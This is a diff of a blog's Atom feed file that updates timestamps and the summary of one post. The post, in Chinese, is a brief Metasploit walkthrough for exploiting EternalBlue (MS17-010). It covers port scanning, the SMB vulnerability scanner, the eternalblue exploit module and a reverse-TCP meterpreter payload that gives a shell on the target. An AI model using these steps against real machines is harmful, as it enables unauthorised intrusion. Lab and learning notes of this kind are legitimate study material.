@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-05-23T16:23:22.179Z</updated>
+  <updated>2020-05-23T16:25:31.360Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,17 +21,13 @@
     <link href="http://yoursite.com/2020/05/23/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
     <id>http://yoursite.com/2020/05/23/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</id>
     <published>2020-05-23T09:58:36.000Z</published>
-    <updated>2020-05-23T16:23:22.179Z</updated>
+    <updated>2020-05-23T16:25:31.360Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h1><pre><code class="bash">scanner查看扫描模块以syn为例子 use auxiliary/scanner/portscan/syn <span class="built_in">set</span> RHPSTS ip and ports 0-500run 永恒之蓝利用445端口 smb服务 操作系统溢出漏洞</code></pre><h1 id="或者可以使用nmap扫描-nmap-sV-ip地址"><a href="#或者可以使用nmap扫描-nmap-sV-ip地址" class="headerlink" title="或者可以使用nmap扫描 nmap -sV ip地址"></a>或者可以使用nmap扫描 nmap -sV ip地址</h1><h1 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h1><h2 id="查看漏洞模块"><a href="#查看漏洞模块" class="headerlink" title="查看漏洞模块"></a>查看漏洞模块</h2><p>查看漏洞模块——search ms17-010<br>可以先使用辅助扫描模块测试 use auxiliary/scanner/smb/smb_ms17_010<br>    set payload ：设置payload，这里用set payload windows/x64/meterpreter/reverse_tcp<br>    要选用其他payload可以使用show payloads查看适合要攻击的目标主机的payload</p><pre><code>## show options ：使用该命令会列出使用当前模块所需呀配置的参数### set RHOST 目标主机地址 ：该命令会设置好要攻击的目标主机地址### set LHOST 攻击机地址 ：该命令设置攻击机的地址，使目标主机回连至攻击机### set LPORT 回连的端口 ：该命令设置目标主机回连至攻击机的端口，默认为4444### run：开始攻击</code></pre><h1 id="使用攻击模块进行攻击-use-exploit-windows-smb-ms17-010-eternalblue"><a href="#使用攻击模块进行攻击-use-exploit-windows-smb-ms17-010-eternalblue" class="headerlink" title="使用攻击模块进行攻击 use exploit/windows/smb/ms17_010_eternalblue"></a>使用攻击模块进行攻击 use exploit/windows/smb/ms17_010_eternalblue</h1><h3 id="成功后会得到一个shell"><a href="#成功后会得到一个shell" class="headerlink" title="成功后会得到一个shell"></a>成功后会得到一个shell</h3><h3 id="到这里漏洞攻击已经成功"><a href="#到这里漏洞攻击已经成功" class="headerlink" title="到这里漏洞攻击已经成功"></a>到这里漏洞攻击已经成功</h3><p> meterpreter汉字乱码问题<br>成因  linux默认是utf-8编码  换成gbk即可</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h1><a id="more"></a><pre><code class="bash">scanner查看扫描模块以syn为例子 use auxiliary/scanner/portscan/syn <span class="built_in">set</span> RHPSTS ip and ports 0-500run 永恒之蓝利用445端口 smb服务 操作系统溢出漏洞</code></pre><h1 id="或者可以使用nmap扫描-nmap-sV-ip地址"><a href="#或者可以使用nmap扫描-nmap-sV-ip地址" class="headerlink" title="或者可以使用nmap扫描 nmap -sV ip地址"></a>或者可以使用nmap扫描 nmap -sV ip地址</h1><h1 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h1><h2 id="查看漏洞模块"><a href="#查看漏洞模块" class="headerlink" title="查看漏洞模块"></a>查看漏洞模块</h2><p>查看漏洞模块——search ms17-010<br>可以先使用辅助扫描模块测试 use auxiliary/scanner/smb/smb_ms17_010<br>    set payload ：设置payload，这里用set payload windows/x64/meterpreter/reverse_tcp<br>    要选用其他payload可以使用show payloads查看适合要攻击的目标主机的payload</p><pre><code>## show options ：使用该命令会列出使用当前模块所需呀配置的参数### set RHOST 目标主机地址 ：该命令会设置好要攻击的目标主机地址### set LHOST 攻击机地址 ：该命令设置攻击机的地址，使目标主机回连至攻击机### set LPORT 回连的端口 ：该命令设置目标主机回连至攻击机的端口，默认为4444### run：开始攻击</code></pre><h1 id="使用攻击模块进行攻击-use-exploit-windows-smb-ms17-010-eternalblue"><a href="#使用攻击模块进行攻击-use-exploit-windows-smb-ms17-010-eternalblue" class="headerlink" title="使用攻击模块进行攻击 use exploit/windows/smb/ms17_010_eternalblue"></a>使用攻击模块进行攻击 use exploit/windows/smb/ms17_010_eternalblue</h1><h3 id="成功后会得到一个shell"><a href="#成功后会得到一个shell" class="headerlink" title="成功后会得到一个shell"></a>成功后会得到一个shell</h3><h3 id="到这里漏洞攻击已经成功"><a href="#到这里漏洞攻击已经成功" class="headerlink" title="到这里漏洞攻击已经成功"></a>到这里漏洞攻击已经成功</h3><p> meterpreter汉字乱码问题<br>成因  linux默认是utf-8编码  换成gbk即可</p>]]></content>
     
     <summary type="html">
     
-      
-      
-        &lt;h1 id=&quot;信息收集阶段&quot;&gt;&lt;a href=&quot;#信息收集阶段&quot; class=&quot;headerlink&quot; title=&quot;信息收集阶段&quot;&gt;&lt;/a&gt;信息收集阶段&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;scanner查看扫描模块
-以syn为例子 use auxilia
-      
+      &lt;h1 id=&quot;信息收集阶段&quot;&gt;&lt;a href=&quot;#信息收集阶段&quot; class=&quot;headerlink&quot; title=&quot;信息收集阶段&quot;&gt;&lt;/a&gt;信息收集阶段&lt;/h1&gt;
     
     </summary>
     
